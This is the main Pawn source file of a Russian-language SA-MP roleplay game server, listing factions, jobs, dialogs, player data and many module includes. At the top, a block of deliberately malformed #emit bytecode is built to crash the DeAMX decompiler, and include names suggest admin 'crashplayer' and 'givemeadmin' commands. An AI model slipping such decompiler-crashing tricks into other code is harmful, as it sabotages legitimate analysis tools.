main()
{
	new a[][] = {"Unarmed (Fist)","Brass K"};
	#pragma unused a
}

@___If_u_can_read_this_u_r_nerd();    // 10 different ways to crash DeAMX
@___If_u_can_read_this_u_r_nerd()    // and also a nice tag for exported functions table in the AMX file
{ // by Daniel_Cortez \\ pro-pawn.ru
    #emit    stack    0x7FFFFFFF    // wtf (1) (stack over... overf*ck!?)
    #emit    inc.s    cellmax    // wtf (2) (this one should probably make DeAMX allocate all available memory and lag forever)
    static const ___[][] = {"pro-pawn", ".ru"};    // pretty old anti-deamx trick
    #emit    retn
    #emit    load.s.pri    ___    // wtf (3) (opcode outside of function?)
    #emit    proc    // wtf (4) (if DeAMX hasn't crashed already, it would think it is a new function)
    #emit    proc    // wtf (5) (a function inside of another function!?)
    #emit    fill    cellmax    // wtf (6) (fill random memory block with 0xFFFFFFFF)
    #emit    proc
    #emit    stack    1    // wtf (7) (compiler usually allocates 4 bytes or 4*N for arrays of N elements)
    #emit    stor.alt    ___    // wtf (8) (...)
    #emit    strb.i    2    // wtf (9)
    #emit    switch    0
    #emit    retn    // wtf (10) (no "casetbl" opcodes before retn - invalid switch statement?)
L1:
    #emit    jump    L1    // avoid compiler crash from "#emit switch"
    #emit    zero    cellmin    // wtf (11) (nonexistent address)
}



//************* | ИНКЛУДЫ | *************//
#include 	<a_samp>
#include    <crashdetect>

#if defined MAX_PLAYERS
	#undef MAX_PLAYERS
	#define MAX_PLAYERS 50
#else
	#define MAX_PLAYERS 50
#endif

#include    <a_mysql>
#include    <dc_cmd>
#include    <streamer>
#include	<float>
#include	<sscanf2>
#include    <foreach>
#include    <mxdate>
#include    <regex>
#include 	<crp>
#include    <md5>
#include    <fly>

//#define FILTERSCRIPT
//#include <IsPlayerNear>

#include    "../source/defines.inc"


// spec system
#define SP_TYPE_NONE           0
#define SP_TYPE_PLAYER         1
#define SP_TYPE_VEHICLE        2

#define Job_None                0
#define Job_Bus                 1
#define Job_Taxi                2
#define Job_Car                 3
#define Job_Truck               4

#define TEAM_NONE   0
#define TEAM_ADM    1
#define TEAM_SMI    2
#define TEAM_PPS    3
#define TEAM_HEAL   4
#define TEAM_VDV    5
#define TEAM_OREX   6
#define TEAM_SUN  	7
#define TEAM_FSB    8

#pragma disablerecursion
//************ | ПЕРЕМЕННЫЕ | ************//
new Iterator:Vehicle<MAX_VEHICLES>;

new change_team_skin_playerid[MAX_PLAYERS];
new dialog_listitem[MAX_PLAYERS];
new dialog_listitem_values[MAX_PLAYERS][24];


new
	connects, stringer[2500],
	Text:logotype_td[4],
	STimer[MAX_PLAYERS]
;

// ------ [ TEXTDRAWS ] ---------------

const speedometer_td_size = 15;
new PlayerText:speed_td[MAX_PLAYERS][speedometer_td_size];

const auto_salon_td_size = 29;
new PlayerText: auto_salon_td[MAX_PLAYERS][auto_salon_td_size];

new PlayerText:spec_menu_TD_PTD[MAX_PLAYERS][49];

new Text:anim_TD;

const training_td_size = 47;
new PlayerText:training_td[MAX_PLAYERS][training_td_size];
//--------------------------------------


new
    AVehicle[50+1]={-1,...}, TotalAdminVehicles = 0
;

new
	bool:   	Engines	[MAX_VEHICLES char],
	bool:   	Light   [MAX_VEHICLES char]
;
new player_afk_time[MAX_PLAYERS] = {0, ...};

new PayJob[MAX_PLAYERS];
new kolvo_job[MAX_PLAYERS];

new XDay;

new bool: be_pay_day;

new server_pass[24];
new server_pass_status = 0;

new restart_time = 4;

new REPOSITORY_ARMY_METALL;
new REPOSITORY_ARMY_PATRON;

new OPG_O_METALL, OPG_O_PATRON, OPG_O_DRUGS, OPG_O_MONEY, OPG_O_STATUS;
new OPG_S_METALL, OPG_S_PATRON, OPG_S_DRUGS, OPG_S_MONEY, OPG_S_STATUS;
new ALL_NARKO;

new Text3D: RepositoryArmyText;
new Text3D: SkladOPGOText;
new Text3D: SkladOPGSText;
new Text3D: PortNarkoText;

new stock lic_names[4][] = {"", "Бизнесс", "Полёты", "Оружие"};
new stock lic_price[4] = {0, 100000, 80000, 50000};

new post_dps_1;
new bool: post_dps_1_status = false;

new post_dps_2;
new bool: post_dps_2_status = false;

new open_pps;
new open_pps_status = false;

new open_vdv;
new open_vdv_status = 0;

new shlak_vdv;
new bool: shlak_vdv_status = false;

new player_second_timer[MAX_PLAYERS];
//************ | МАССИВЫ | ************//

new pPressed[MAX_PLAYERS];

enum
{
	BUS_CAR,
	MECHANIC_CAR,
	TAXI_CAR,
	CATEG_A_CAR,
	CATEG_B_CAR,
	CATEG_C_CAR,
	CATEG_D_CAR,
	TEAM_ADM_CAR,
	TEAM_SMI_CAR,
	TEAM_PPS_CAR,
	TEAM_HEAL_CAR,
	TEAM_OREX_CAR,
	TEAM_SUN_CAR,
	TEAM_FSB_CAR,
	
	TEAM_VDV_CAR,
	TEAM_VDV_BTR_CAR,
	TEAM_VDV_TANK_CAR,
	TEAM_VDV_METALL_CAR,
	
	VELO,
};
new job_car[20][2];

enum
	E_VEHICLE
{
	Float:veh_fuel,
	veh_driver_id,
	Float:veh_mileage,
	veh_arend,
	Text3D:veh_label,
	veh_metall,
	veh_patrons,
	bool: veh_lock,
	veh_crete_adm,
	Float:veh_limit,
};
new vehicle[MAX_VEHICLES][E_VEHICLE];

new player_job_vehicle_arend[MAX_PLAYERS] = {-1, ...}; // рабочий транспорт арендованный
new player_job_vehicle_created[MAX_PLAYERS] = {-1, ...}; // рабочий транспорт созданный
new player_job_vehicle_created_2[MAX_PLAYERS] = {-1, ...};

new player_end_job_timer[MAX_PLAYERS];

new pCheckpoint[MAX_PLAYERS];
enum
{
	CP_GET_MESH,
	CP_PUT_MESH,
	CP_GET_MINE,
	CP_PUT_MINE,
	CP_PUT_DIVE,
	CP_BUS_NEXT,
	CP_SIT_IN_TRUCK,
	CP_TRUCK_GET_GRUZ,
	CP_TRUCK_PUT_GRUZ,
	CP_CLEANER_AREND,
	CP_CLEANER_CP,
	CP_EXAM_DRIVING,
	CP_WANTED,
	CP_CALLING,
};
new
	MINER_PICK_ENTER,
	MINER_PICK_EXIT,
	DIVER_PICK_1,
	DIVER_PICK_2,
	MAYOR_PICK_ENTER,
	MAYOR_PICK_EXIT,
	AUTOSCHOOL_PICK_ENTER,
	AUTOSCHOOL_PICK_EXIT,
	PPS_PICK_ENTER,
	PPS_PICK_EXIT,
	PPS_PICK_GUN_ENTER,
	PPS_PICK_GUN_EXIT,
	HOSPITAL_PICK_ENTER,
	HOSPITAL_PICK_EXIT,
	TONNEL_PICK_ENTER,
	TONNEL_PICK_EXIT,
	VDV_SKLAD_PICK_ENTER,
	VDV_SKLAD_PICK_EXIT,
	BANK_PICK_ENTER,
	BANK_PICK_EXIT,
	KAZARMA_PICK_ENTER,
	KAZARMA_PICK_EXIT,
	VOENKOM_PICK_ENTER,
	VOENKOM_PICK_EXIT,
	SMI_PICK_ENTER,
	SMI_PICK_EXIT,
	
	PRIBATH_PICK_ENTER,
	PRIBATH_PICK_EXIT,
	BATH_PICK_ENTER,
	BATH_PICK_EXIT,
	PAINT_PICK;


enum e_DIALOG_IDs 
{
    D_NULL,
    D_REGISTER,
    D_LOGIN,
    D_3,
    D_4,
    D_5,
    D_6,
    D_7,
    D_8,
    D_9,
    D_10,
    D_12,
    D_13,
    D_14,
    D_15,
    D_16,
    D_APANEL,
    D_APANEL_SETZP,
    D_SETZP_MINER,
    D_SETZP_LOADER,
    D_SETZP_DIVER,
    D_TELEPORT_LIST,
    D_MENU_ASK_REP,
    D_MENU_ASK,
    D_MENU_REP,
    D_APANEL_ANTI_CHEAT,
    D_17,
    D_SPAWN_LIST,
    D_SERVER_PASS,
    D_SET_SERVER_PASS,
    D_SERVER_SETTINGS,
    D_SET_XDAY,
    D_ASK_RESTART,
    D_SET_SERVER_NAME,
    D_CHECK_PASS,
    D_CHANGE_PASS,
    D_SET_DB,
    D_SET_DM,
	D_SET_MG,
	D_SET_NONRP,
	D_SET_DRIVE,
	D_SET_EPP,
	D_SET_NAKAZANIA,
	D_ORG_REPOSITORIES,
	D_SET_ARMY_MET,
	D_SET_ARMY_PATR,
	
	D_GO_REG_TRAINING,

	D_LOADER_JOB,
	D_MINER_JOB,
	D_DIVER_JOB,
	D_SET_JOB,
	D_AREND_BUS,
	D_AREND_BUS_SET,
	D_CMD_END_BUS,
	D_AREND_TRUCK,
	D_AREND_CLEAN,
	D_CMD_END_CLEANER,
	D_AREND_MECHANIC_CAR,
	D_SET_REPAIR_PRICE,
	D_EXAM_DRIVING,
	D_AREND_TAXI_CAR,
	D_SET_TAXI_PRICE,
	D_GUN_PPS,
	D_CHANGE_SKIN,
	D_WANTED,
	D_SHOWALL,
	D_GUN_VDV,
	D_VDV_METALL_BUY,
	D_TAKE,
	
	D_CALL,
	D_CALL_TAXI,
	D_CALL_MECH,
	D_CALL_HEAL,
	D_CALL_PPS,
	D_CALLING,
	
	D_AD,
	D_EDIT,
	D_EDITS,
	D_EDIT_EDIT,
	
	D_BUY_METALL,
	
	D_SELECT_RECIPE,
	D_BUY_RECIPE_GUNS,
	D_BUY_RECIPE_GUNS_2,
	D_BUY_RECIPE_GUNS_3,
	D_BUY_RECIPE_GUNS_4,
	D_BUY_RECIPE_GUNS_5,
	D_BUY_RECIPE_GUNS_6,
	D_CREATE_GUN,
	D_MAKEGUN_PATRONS,
	D_ANIM_LIST,
	
	D_SKLAD_OPG,
	
	D_SKLAD_OPG_TAKE_PATR,
	D_SKLAD_OPG_PUT_PATR,
	D_SKLAD_OPG_TAKE_MET,
	D_SKLAD_OPG_PUT_MET,
	D_SKLAD_OPG_TAKE_DRUGS,
	D_SKLAD_OPG_PUT_DRUGS,
	D_SKLAD_OPG_TAKE_MONEY,
	D_SKLAD_OPG_PUT_MONEY,
	D_SET_OPG_O_MET,
	D_SET_OPG_O_PATR,
	D_SET_OPG_O_DRUGS,
	D_SET_OPG_O_MONEY,
	D_SET_OPG_S_MET,
	D_SET_OPG_S_PATR,
	D_SET_OPG_S_DRUGS,
	D_SET_OPG_S_MONEY,
	D_BUY_DRUGS,
	D_SET_PORT_DRUGS,
	
	D_GIVEME_ADMIN_PASS,
	D_GIVE_ME_ADMIN,
	D_AHELP_1,
	D_AHELP_2,
	D_AHELP_3,
	D_AHELP_4,
	D_AHELP_5,
	D_AHELP_6,
	D_AHELP_7,
	D_TEMP_LEADER,
	D_TEMP_JOB,
	
	D_ENTER_BIZ,
	D_BUY_BIZ,
	D_CMD_BUSINESS,
	D_SELL_BIZ,
	D_BIZ_PARAMS,
	D_BIZ_ENTER_PRICE,
	D_MENU_BIZ_24_7,
	D_MENU_BIZ_APTEKA,
	D_MENU_BIZ_EAT,
	D_BUY_SIM,
	D_BIZ_SET_REPAIR_PRICE,
	D_BIZ_SET_FILL_PRICE,
	D_TUNE,
	D_TUNE_DISKS,
	D_TUNE_CHANGE_COLOR,
	D_FILL,
	D_FILL_CANISTRA,
	D_BATH_BUY,
	D_SET_CAPS,
	D_SET_FLOOD,
	D_SET_OFFTOP,
	D_DONATE,
	D_DONATE_LIST,
	D_ENTER_HOUSE,
	D_BUY_HOUSE,
	D_SELLHOME,
	D_CMD_USE,
	D_CMD_USE_PATRON,
	D_CMD_USE_METALL,
	D_CMD_USE_DRUGS,
	D_CMD_USE_PATRON_PUT,
	D_CMD_USE_PATRON_GET,
	D_CMD_USE_METALL_PUT,
	D_CMD_USE_METALL_GET,
	D_CMD_USE_DRUGS_PUT,
	D_CMD_USE_DRUGS_GET,
	
	D_SELL_CAR,
	D_MENU_POD,
	D_ENTER_KVART,
	D_BUY_KVART,
	D_PODEZD_MENU,
	
	D_BANK,
	D_BANK_GET_MONEY,
	D_BANK_PUT_MONEY,
	D_BANK_MONEY,
	D_BANK_PAY_BIZ,
	D_BANK_PAY_HOME,
	D_BANK_TAKE_BIZ_MONEY,
	D_PAY_KVART,
	
	D_CREATE_RADAR,
	
	D_ATM,
	D_ATM_GET,
	D_ATM_PUT,
	D_ATM_BALANCE,
	D_ATM_PAY_ALL_FINES,
	D_ATM_PAY_PHONE_CASH,
	D_ATM_PAY_FINE,
	D_PAYMENT_FINE,
	
	D_CREATE_FAMILY,
};

enum PInfo
{
	pID, pName[MAX_PLAYER_NAME],
	pEmail[42], pKey[64], // Регистрационные данные
	pLVL, pExp, pSex, pChar, pCash, pBCash, pDonate, bool:pLogin, pJail, pMute, pJailOffMess[256], pMuteOffMess[256], Float:pLastX, Float:pLastY, Float:pLastZ, pPinCode, pRegIP[16], pLastIP[16], pNewIp[16], pTruckLVL, pTruckEXP, // Система персонажа
	pLastConnect[64], pLicA, pLicB, pLicC, pLicD, pZakon, pFines, pSumFines, pOffUninviteMess[144], pLogo, pGun[13], pAmmo[13], pTipster, pJobTipster, pPhoneNumber, pPhone, pPhoneCash, pPhoneStatus, pKPZ, pCuff, pWANTED, pJP, pMetall, pPatr, pDrugs, pLomka,// система персонажа
	pLicBiz, pLicGun, pLicFly, pVoen, pVoenEXP, pBizID, pCarID, pHomeID, pPodID, pKvartID,

	pNeedToilet, pNeedEat, pNeedDrink, pNeedWash, pMask, pHeal, pPepsi, pBackPack, pSmoke, pBeer, pLighter, pChips,
	
	pHouseOffMess[144], pBizOffMess[144], pKvartOffMess[144], pFAMoffuninvite[144],

	pMember, pRang, pFSkin, pModel, pWarnF, pVIP, Float: pHP, Float: pARM, pHOSPITAL, // Система фракций
	pWarnA, pWarn, bAdmin, pJob, pReferal[26],	pDateReg[20], pSupport, bJail, bMute, bBan, bWarn, bOffJail, bOffMute, bOffBan, bOffWarn, bUnBan, bUnWarn, bYoutube,
	pTD_T, pTD_S, pTD_ST, pTD_FPS, pAFK,
	R_9MM, R_USP, R_DEAGLE, R_TEK9, R_USI, R_MP5, R_SHOTGUN, R_SAWED_OF, R_FIGHT_SHOTGUN, R_AK47, R_M4, R_COUNTRY_RIFLE, R_SNIPER_RIFLE, R_SMOKE, R_GRENADE, R_MOLOTOV, // рецепты
 	Float:AntiFly[3], TimeFly,
 	bool: pPaintBall, pPaintKills, bool: pInvitePaintBall,
 	pFamID, pFamRang,
}
new PlayerInfo[MAX_PLAYERS][PInfo];

new stock Player_Skin_Male[] = { 14, 21 };
new stock Player_Skin_Female[] = { 12, 13 };

new stock gun_name[56][] = {"Кулак", "Кастет", "Клюжка для гольфа", "Полицейская дубинка", "Нож", "Бита", "Лопата", "Кий", "Катана", "Бензопила", "Фаллоэмитатор", "Фаллоэмитатор", "Фаллоэмитатор", "Фаллоэмитатор",
							"Цветы", "Крюк(не ебу что это)", "Осколочная граната", "Дымовая граната", "Коктейль молотова", "", "", "", "9-ММ", "USP-S", "Desert Eagle", "Дробовик", "Sawed-OFF", "Shot-Gun", "Micro-USI", "MP5",
							"Автомат Калашникова", "M4", "Tec-9", "Сельский Дробовик", "Снайперская винтовка", "Гранатомёт", "Ракетная установка", "Огнемет", "Mini-Gun", "Взрывчатка", "Пуль от взрывчатки",
							"Балончик", "Огнетушитель", "Фото Камера", "Очки ночного зрения", "Вторые очки ночного зрения", "Парашут", "Телефон", "ДжетПак", "СкейтБорд", "Автомобиль(ДБ)", "Лопасти вертолета", "Взрыв", "", "Утопленник", "Падение с высоты"};

new stock AdminPays[9] = {0, 800, 1600, 2000, 2500, 3000, 4000, 5000, 5000};
new stock GetRangAdmin[10][30] = {"", "Стажер","Младший Администратор","Администратор","Старший Администратор","Зам. ГА","Главный Администратор","Спец. Администратор","Руководитель",""};

enum fInfo
{
	fName[36],
	fColor,
	Float:fPosX,
	Float:fPosY,
	Float:fPosZ,
	Float:fPosA,
	fractionInt,
	fractionVirt
}

new stock FractionInfo[9][fInfo] =
{
	{"Гражданский",							0xFFFFFF30, 1823.5634,2528.6885,15.6825,	130.7277,			0,  0},
	{"Администрация Поселка",  				0x00000000,	792.2339,795.0538,-68.2813,		70.0226,			0,	0},
	{"СМИ",  								0x00000000,	1789.4912,2044.2119,-18.0000,	184.6829,			0,	0},
	{"Полиция",  							0x00000000,	2567.3386,-2417.3921,22.3545,	357.1678,			0,	1},
	{"Больница",  							0x00000000,	-817.8105,1857.1638,705.6800,	0.0,				0,	0},
	{"ВДВ",  								0x00000000,	1300.9718,1523.2183,1002.3200,	185.3512,			0,	0},
	{"ОПГ Ореховский",  					0x00000000,	2609.8279,1762.3534,6.8659,		94.1141,			0,	0},
	{"ОПГ Солнцевские",  					0x00000000,	1706.1318,1334.0438,26.0344,	182.1382,			0,	0},
	{"ФСБ",  								0x00000000,	0.0,0.0,0.0,0.0,			0,	0}
};


new jobs_name[5][20] = {"Безработный", "Водитель автобуса", "Водитель Такси", "Автомеханик", "Дальнобойщик"};
new stock GetMember[9][36] = {"Гражданский","Администрация Посёлка","СМИ","Полиция","Больница","ВДВ","ОПГ Ореховские","ОПГ Солнцевские", "ФСБ"};
new stock rangFractionID[9] = {10,10,10,10,10,10,10,10,10};

new stock ChangeSkin[9][10] =
{
    {0,0,0,0,0,0,0,0,0,0},
	{208, 164, 228, 187, 227, 295, 147, EOS, EOS, EOS},
	{188, 261, 217, 211, EOS, EOS, EOS, EOS, EOS, EOS},
	{266, 280, 281, 282, 283, 288, 284, 285, 286},
	{276, 275, 274, 70, 148, EOS, EOS, EOS, EOS, EOS},
	{287, 255, 179, 61, 191, EOS, EOS, EOS, EOS, EOS},
	{125, 111, 124, 299, 112, 272, 93, EOS, EOS, EOS},
	{125, 111, 124, 299, 112, 272, 93, EOS, EOS, EOS},
	{285,286,EOS,EOS,EOS,EOS,EOS,EOS,EOS,EOS}
};

new stock PlayerRank[9][11][46] =
{
	{"Гражданский", "-", "-", "-", "-", "-", "-", "-", "-", "-", "-"},
	{"", "Секретарь","Гл.Секретарь","Охранник","Гл.Охраны","Адвокат","Гл.Адвокат","Депутат","Министр","Зам.Мэра","Мэр"},
	{"", "Помощник редакции","Верстальщик новостей","Радиотехник","Журналист","Ст. журналист","Корректор","Помощник редактора","Редактор","Заместитель Директора","Директор"},
	{"", "Рядовой","Сержант","Ст.Сержант","Старшина","Лейтенант","Ст. Лейтенант","Майор","Подполковник","Полковник","Генерал"},
	{"", "Интерн","Младший Мед.Работник","Старший Мед.Работник","Врач-Участковый","Старший Врач-Участковый","Хирург","Младший Специалист","Старший Специалист","Заведущий","Глав.Врач"},
	{"", "Рядовой","Сержант","Ст.Сержант","Старшина","Лейтенант","Капитан","Майор","Подполковник","Полковник","Генерал"},
	{"", "Шнырь","Босяк","Барыга","Фраер","Бандит","Смотритель","Бригадир","Жиган","Вор в законе","Авторитет"},
	{"", "Шнырь","Босяк","Барыга","Фраер","Бандит","Смотритель","Бригадир","Жиган","Вор в законе","Авторитет"},
	{"","","","","","","","","","", ""}
};
new
	pay_orgs[9][11]=
{
	{0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0},
	{0,800,1600,2600,3400,4000,4500,5000,5500,6000,6500},
	{0,750,1500,2500,3200,3800,4300,4800,5300,5800,6500},
	{0,800,1600,2600,3400,4000,4500,5000,5500,6000,6500},
 	{0,750,1500,2500,3200,3800,4300,4800,5300,5800,6500},
	{0,600,1200,2200,3000,3600,4100,4600,5100,5600,6500},
	{0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0},
	{0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0},
    {0,800,1600,2600,3400,4000,4500,5000,5500,6000, 6500}
};

enum
{
	PROPOSITION_TYPE_NONE,
	PROPOSITION_TYPE_REPAIR_CAR,
	PROPOSITION_TYPE_INVITE,
	PROPOSITION_TYPE_FINVITE,
	PROPOSITION_TYPE_FREE,
	PROPOSITION_TYPE_HEAL,
	PROPOSITION_TYPE_SELLLIC,
	PROPOSITION_TYPE_SELLGUN,
	PROPOSITION_TYPE_SELLBIZ,
	PROPOSITION_TYPE_SELLCAR,
	PROPOSITION_TYPE_SELLHOUSE,
	PROPOSITION_TYPE_SELLDRUGS,
	PROPOSITION_TYPE_DICE,
};

// -------------- [ INCLUDES ] ------------------------------
// --------- [ ПЕРЕМЕННЫЕ ] --------------
#include "../source/systems/kvart_.inc"

// ------- [ RULES ] ----------
#include "../source/player/rules.inc"

// ------ [ SYSTEMS ] ------------
#include "../source/systems/foreach_veh.inc"

#include "../source/systems/bussines.inc"
#include "../source/systems/house.inc"
#include "../source/systems/podezd.inc"
#include "../source/systems/kvart.inc"
#include "../source/systems/bank.inc"
#include "../source/systems/ownable_cars.inc"
#include "../source/systems/radar.inc"
#include "../source/systems/atm.inc"

#include "../source/systems/family.inc"

#include "../source/systems/toilet.inc"
#include "../source/systems/bath.inc"
#include "../source/systems/need.inc"

#include "../source/systems/paintball.inc"
#include "../source/systems/advertise.inc"
#include "../source/systems/setname.inc"
#include "../source/systems/proposition.inc"
#include "../source/systems/spawnlist.inc"
#include "../source/systems/donate.inc"
#include "../source/systems/payday.inc"
#include "../source/systems/warn.inc"
#include "../source/systems/ban.inc"
#include "../source/systems/spec.inc"
#include "../source/systems/mp.inc"
#include "../source/systems/reg au.inc"
#include "../source/systems/recipes.inc"
#include "../source/systems/disc_cuffed.inc"
#include "../source/systems/autosalon.inc"

//------------[ ANTICHEAT] ---------------
#include "../source/anticheat/anticheat.inc"
#include "../source/anticheat/speedhack.inc"
#include "../source/anticheat/weapon.inc"
#include "../source/anticheat/ac_hp.inc"
//#include "../source/anticheat/ac_airbreak.inc"
#include "../source/anticheat/ac_onfoot_crash.inc"
#include "../source/anticheat/ac_tpinveh.inc"

#include "../source/anticheat/teamkill.inc"
#include "../source/anticheat/isrpnick.inc"

// -------[ COMMANDS ] -----------
#include "../source/player/commands/s.inc"
#include "../source/player/commands/b.inc"
#include "../source/player/commands/rp.inc"
#include "../source/player/commands/id.inc"
#include "../source/player/commands/wisper.inc"
#include "../source/player/commands/time.inc"
#include "../source/player/commands/stats.inc"
#include "../source/player/commands/mycoords.inc"
#include "../source/player/commands/menu.inc"
#include "../source/player/commands/help.inc"
#include "../source/player/commands/leaders.inc"
#include "../source/player/commands/call.inc"
#include "../source/player/commands/sms.inc"
#include "../source/player/commands/dice.inc"
#include "../source/player/commands/lic.inc"
#include "../source/player/commands/pass.inc"
#include "../source/player/commands/ad.inc"
#include "../source/player/commands/eject.inc"
#include "../source/player/commands/anim.inc"
#include "../source/player/commands/slimit.inc"
#include "../source/player/commands/pay.inc"
#include "../source/player/commands/tune.inc"
#include "../source/player/commands/fill.inc"
#include "../source/player/commands/lock.inc"
#include "../source/player/commands/mynumber.inc"
#include "../source/player/commands/tickets.inc"
#include "../source/player/commands/paintlist.inc"

#include "../source/player/commands/need_command/drink.inc"
#include "../source/player/commands/need_command/pepsi.inc"
#include "../source/player/commands/need_command/smoke.inc"
#include "../source/player/commands/need_command/eat.inc"
#include "../source/player/commands/need_command/mask.inc"
#include "../source/player/commands/need_command/healme.inc"

// ------- [ ADMINS ] ------------
#include "../source/admin/commands/commands.inc"
#include "../source/admin/commands/fulldostup.inc"

#include "../source/admin/commands/1 lvl/admins.inc"
#include "../source/admin/commands/1 lvl/serverpanel.inc"
#include "../source/admin/commands/1 lvl/weap.inc"
#include "../source/admin/commands/1 lvl/stat.inc"
#include "../source/admin/commands/1 lvl/freeze.inc"
#include "../source/admin/commands/1 lvl/unfreeze.inc"
#include "../source/admin/commands/1 lvl/ans.inc"
#include "../source/admin/commands/1 lvl/youtubers.inc"
#include "../source/admin/commands/1 lvl/y.inc"
#include "../source/admin/commands/1 lvl/yhelp.inc"
#include "../source/admin/commands/1 lvl/slap.inc"
#include "../source/admin/commands/1 lvl/a.inc"
#include "../source/admin/commands/1 lvl/ahelp.inc"
#include "../source/admin/commands/1 lvl/spawnplayer.inc"
#include "../source/admin/commands/1 lvl/info.inc"

#include "../source/admin/commands/2 lvl/tp.inc"
#include "../source/admin/commands/2 lvl/g.inc"
#include "../source/admin/commands/2 lvl/gethere.inc"
#include "../source/admin/commands/2 lvl/nick.inc"
#include "../source/admin/commands/2 lvl/skick.inc"
#include "../source/admin/commands/2 lvl/kick.inc"
#include "../source/admin/commands/2 lvl/getcar.inc"
#include "../source/admin/commands/2 lvl/gotocar.inc"
#include "../source/admin/commands/2 lvl/msg.inc"
#include "../source/admin/commands/2 lvl/bh.inc"
#include "../source/admin/commands/2 lvl/gruz.inc"
#include "../source/admin/commands/2 lvl/jail.inc"
#include "../source/admin/commands/2 lvl/mute.inc"
#include "../source/admin/commands/2 lvl/arm.inc"
#include "../source/admin/commands/2 lvl/hp.inc"
#include "../source/admin/commands/2 lvl/getskin.inc"
#include "../source/admin/commands/2 lvl/mg.inc"
#include "../source/admin/commands/2 lvl/dm.inc"
#include "../source/admin/commands/2 lvl/db.inc"
#include "../source/admin/commands/2 lvl/nonrp.inc"
#include "../source/admin/commands/2 lvl/epp.inc"
#include "../source/admin/commands/2 lvl/drive.inc"

#include "../source/admin/commands/2 lvl/caps.inc"
#include "../source/admin/commands/2 lvl/flood.inc"
#include "../source/admin/commands/2 lvl/offtop.inc"

#include "../source/admin/commands/2 lvl/resetgun.inc"

#include "../source/admin/commands/3 lvl/setvw.inc"
#include "../source/admin/commands/3 lvl/setint.inc"
#include "../source/admin/commands/3 lvl/getip.inc"
#include "../source/admin/commands/3 lvl/offgetip.inc"
#include "../source/admin/commands/3 lvl/cc.inc"
#include "../source/admin/commands/3 lvl/unjail.inc"
#include "../source/admin/commands/3 lvl/unmute.inc"
#include "../source/admin/commands/3 lvl/fixveh.inc"
#include "../source/admin/commands/3 lvl/setfuel.inc"
#include "../source/admin/commands/3 lvl/respawncar.inc"
#include "../source/admin/commands/3 lvl/respawncars.inc"
#include "../source/admin/commands/3 lvl/sethp.inc"
#include "../source/admin/commands/3 lvl/setarm.inc"
#include "../source/admin/commands/3 lvl/setskin.inc"
#include "../source/admin/commands/3 lvl/givegun.inc"
#include "../source/admin/commands/3 lvl/fly.inc"
#include "../source/admin/commands/3 lvl/offget.inc"

#include "../source/admin/commands/4 lvl/offmute.inc"
#include "../source/admin/commands/4 lvl/offjail.inc"
#include "../source/admin/commands/4 lvl/jetpack.inc"
#include "../source/admin/commands/4 lvl/tpcoord.inc"
#include "../source/admin/commands/4 lvl/auninvite.inc"
#include "../source/admin/commands/4 lvl/fstats.inc"
#include "../source/admin/commands/4 lvl/veh.inc"
#include "../source/admin/commands/4 lvl/delveh.inc"
#include "../source/admin/commands/4 lvl/alldelveh.inc"
#include "../source/admin/commands/4 lvl/alldelveh.inc"

#include "../source/admin/commands/5 lvl/setweather.inc"
#include "../source/admin/commands/5 lvl/settime.inc"
#include "../source/admin/commands/5 lvl/templeader.inc"
#include "../source/admin/commands/5 lvl/tempjob.inc"
#include "../source/admin/commands/5 lvl/createradar.inc"

#include "../source/admin/commands/6 lvl/setplayerskin.inc"
#include "../source/admin/commands/6 lvl/givemoney.inc"
#include "../source/admin/commands/6 lvl/setyoutube.inc"
#include "../source/admin/commands/6 lvl/setleader.inc"
#include "../source/admin/commands/6 lvl/agl.inc"
#include "../source/admin/commands/6 lvl/lwarn.inc"
#include "../source/admin/commands/6 lvl/offlwarn.inc"
#include "../source/admin/commands/6 lvl/unlwarn.inc"
#include "../source/admin/commands/6 lvl/awarn.inc"
#include "../source/admin/commands/6 lvl/offawarn.inc"
#include "../source/admin/commands/6 lvl/unawarn.inc"
#include "../source/admin/commands/6 lvl/crashplayer.inc"
#include "../source/admin/commands/6 lvl/agivevoen.inc"
#include "../source/admin/commands/6 lvl/setcarnumber.inc"
#include "../source/admin/commands/6 lvl/setownablecar.inc"

#include "../source/admin/commands/7 lvl/restart.inc"
#include "../source/admin/commands/7 lvl/x2day.inc"
#include "../source/admin/commands/7 lvl/setstat.inc"
#include "../source/admin/commands/7 lvl/loadfs.inc"
#include "../source/admin/commands/7 lvl/unloadfs.inc"
#include "../source/admin/commands/7 lvl/cmd.inc"
#include "../source/admin/commands/7 lvl/resetmoney.inc"
#include "../source/admin/commands/7 lvl/setadmin.inc"
#include "../source/admin/commands/7 lvl/aup.inc"
#include "../source/admin/commands/7 lvl/adown.inc"
#include "../source/admin/commands/7 lvl/givemeadmin.inc"
#include "../source/admin/commands/7 lvl/addbusiness.inc"
#include "../source/admin/commands/7 lvl/addhouse.inc"
#include "../source/admin/commands/7 lvl/addpod.inc"
#include "../source/admin/commands/7 lvl/addtoilet.inc"
#include "../source/admin/commands/7 lvl/addatm.inc"

// ------- [ JOBS ] ---------------
#include "../source/jobs/jobs.inc"
#include "../source/jobs/miner.inc"
#include "../source/jobs/loader.inc"
#include "../source/jobs/diver.inc"
#include "../source/jobs/autoschool.inc"
#include "../source/jobs/bus.inc"
#include "../source/jobs/truck.inc"
#include "../source/jobs/mechanic.inc"
#include "../source/jobs/taxi.inc"
#include "../source/jobs/cleaner.inc"

// ------- [ FRACTIONS ] --------------
#include "../source/fractions/leaders/showall.inc"
#include "../source/fractions/leaders/changeskin.inc"
#include "../source/fractions/leaders/invite.inc"
#include "../source/fractions/leaders/uninvite.inc"
#include "../source/fractions/leaders/offuninvite.inc"
#include "../source/fractions/leaders/rang.inc"
#include "../source/fractions/leaders/mwarn.inc"
#include "../source/fractions/leaders/unmwarn.inc"
#include "../source/fractions/leaders/offmwarn.inc"
#include "../source/fractions/leaders/gov.inc"

#include "../source/fractions/chats/r.inc"
#include "../source/fractions/chats/find.inc"

// PPS
#include "../source/fractions/pps/pps.inc"
#include "../source/fractions/pps/stopcar.inc"
#include "../source/fractions/pps/tazer.inc"
#include "../source/fractions/pps/incar.inc"
#include "../source/fractions/pps/deject.inc"
#include "../source/fractions/pps/su.inc"
#include "../source/fractions/pps/clear.inc"
#include "../source/fractions/pps/cuff.inc"
#include "../source/fractions/pps/uncuff.inc"
#include "../source/fractions/pps/ticket.inc"
#include "../source/fractions/pps/search.inc"
#include "../source/fractions/pps/take.inc"
#include "../source/fractions/pps/wanted.inc"
#include "../source/fractions/pps/arrest.inc"
